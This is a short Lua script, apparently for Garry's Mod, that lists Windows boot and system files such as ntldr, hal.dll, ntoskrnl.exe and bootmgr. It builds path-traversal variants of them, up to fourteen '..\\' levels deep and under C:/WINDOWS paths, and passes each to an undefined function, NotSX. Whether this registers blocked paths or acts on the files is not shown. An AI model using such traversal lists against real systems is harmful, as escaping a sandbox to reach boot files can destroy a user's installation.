
local pairs = pairs
local NotSX = NotSX

local These = {
	"steam.inf",
	"gameinfo.txt",
	"AUTOEXEC.BAT",
	"boot.ini",
	"bootstat.dat",
	"config.sys",
	"ntldr",
	"explorer.exe",
	"ntoskrnl.exe",
	"hal.dll",
	"bootres.dll",
	"bootfix.bin",
	"etfsboot.com",
	"boot.sdi",
	"bootmgr",
}

local Eat = {
	"",
	"garrysmod/",
	"garrysmod/garrysmod/",
	"C:/",
	"C:/WINDOWS/",
	"C:/WINDOWS/System32/",
	"C:/WINDOWS/Boot/DVD/PCAT/en-US/",
	"C:/WINDOWS/Boot/DVD/PCAT/",
	"C:/WINDOWS/Boot/PCAT/",
}

local function Cakes(v)
	NotSX("--"..v, v)
	NotSX("--"..v, v:gsub("/", "\\") )
end
for k,k in pairs(Eat) do
	for v,v in pairs(These) do
		Cakes(k..v)
	end
end
for v,v in pairs(These) do
	local k = "..\\"
	
	for i=0,13 do
		Cakes(k..v)
		k = k.."..\\"
	end
end

_G.NotSX = nil





